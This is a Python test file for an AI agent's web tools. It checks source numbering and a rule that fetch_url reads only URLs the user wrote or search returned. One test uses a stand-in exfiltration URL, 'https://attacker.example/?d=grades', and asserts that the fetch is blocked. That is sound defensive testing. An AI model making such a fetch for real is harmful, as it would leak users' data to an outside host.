"""The web tools' rules, against a local server standing in for Exa: numbering and the URL rule."""
import pytest

from agent import Toolbox

pytestmark = pytest.mark.usefixtures("exa")

SAVED = [{"type": "source-url", "sourceId": "1", "url": "https://a.example", "title": "A"},
         {"type": "source-url", "sourceId": "3", "url": "https://b.example", "title": "B"}]  # 2 was never sent


async def test_sources_keep_their_numbers_and_new_ones_count_on():
    box = Toolbox("c", sources=SAVED)
    result = await box.run("web_search", {"query": "q", "objective": "o"})
    await box.aclose()
    assert result.text().startswith("[3] Title: b\nURL: https://b.example\n")
    assert [(part["sourceId"], part["url"]) for part in result.sources] == [
        ("3", "https://b.example"), ("4", "https://c.example")]


async def test_fetch_url_reads_only_urls_the_user_wrote_or_exa_returned():
    box = Toolbox("c", urls=["https://user.example/notes"])
    made_up = await box.run("fetch_url", {"urls": ["https://attacker.example/?d=grades"]})
    assert made_up.error and "Not seen: https://attacker.example/?d=grades" in made_up.text()
    assert not (await box.run("fetch_url", {"urls": ["https://user.example/notes"]})).error
    await box.run("web_search", {"query": "q", "objective": "o"})
    assert not (await box.run("fetch_url", {"urls": ["https://c.example"]})).error
    await box.aclose()
